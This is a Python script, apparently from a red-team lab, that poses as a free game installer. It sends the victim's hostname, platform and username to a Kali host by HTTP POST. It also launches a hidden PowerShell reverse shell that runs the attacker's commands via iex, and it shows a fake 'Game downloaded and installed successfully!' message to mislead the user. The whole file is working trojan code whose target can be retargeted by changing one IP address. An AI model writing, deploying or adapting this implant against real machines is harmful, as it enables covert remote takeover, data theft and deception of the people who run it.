from pathlib import Path
from datetime import datetime
import ctypes
import urllib.request
import urllib.parse
import platform
import socket
import subprocess
import threading

# ====================== CẤU HÌNH ======================
KALI_IP = "192.168.10.140"
CALLBACK_PORT = 8080
REVERSE_SHELL_PORT = 4444
# ======================================================


def write_marker():
    try:
        marker_dir = Path.home() / "AppData" / "Local" / "Temp"
        marker_dir.mkdir(parents=True, exist_ok=True)
        marker = marker_dir / "redteam_lab_marker.txt"
        content = (
            "Red Team Lab - Initial Access Successful\n"
            f"Time      : {datetime.now().isoformat()}\n"
            f"Hostname  : {socket.gethostname()}\n"
            f"Platform  : {platform.platform()}\n"
            f"User      : {Path.home().name}\n"
        )
        marker.write_text(content, encoding="utf-8")
    except Exception:
        pass


def send_callback():
    try:
        data = urllib.parse.urlencode({
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": Path.home().name,
            "time": datetime.now().isoformat(),
        }).encode()

        url = f"http://{KALI_IP}:{CALLBACK_PORT}/callback"
        req = urllib.request.Request(
            url,
            data=data,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        with urllib.request.urlopen(req, timeout=6) as resp:
            resp.read()
    except Exception:
        pass


def reverse_shell():
    try:
        ps_command = (
            f'$c=New-Object System.Net.Sockets.TCPClient("{KALI_IP}",{REVERSE_SHELL_PORT});'
            '$s=$c.GetStream();'
            '[byte[]]$b=0..65535|%{0};'
            'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
            '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
            '$sb=(iex $d 2>&1 | Out-String);'
            '$sb2=$sb + "PS " + (pwd).Path + "> ";'
            '$x=([text.encoding]::ASCII).GetBytes($sb2);'
            '$s.Write($x,0,$x.Length);'
            '$s.Flush()'
            '};'
            '$c.Close()'
        )

        subprocess.Popen(
            [
                "powershell.exe",
                "-NoP",
                "-NonI",
                "-W", "Hidden",
                "-Command", ps_command
            ],
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
    except Exception:
        pass


def show_notification():
    try:
        ctypes.windll.user32.MessageBoxW(
            0,
            "Game downloaded and installed successfully!",
            "Free Game",
            0x40
        )
    except Exception:
        pass


def main():
    write_marker()
    send_callback()
    t = threading.Thread(target=reverse_shell, daemon=True)
    t.start()
    show_notification()


if __name__ == "__main__":
    main()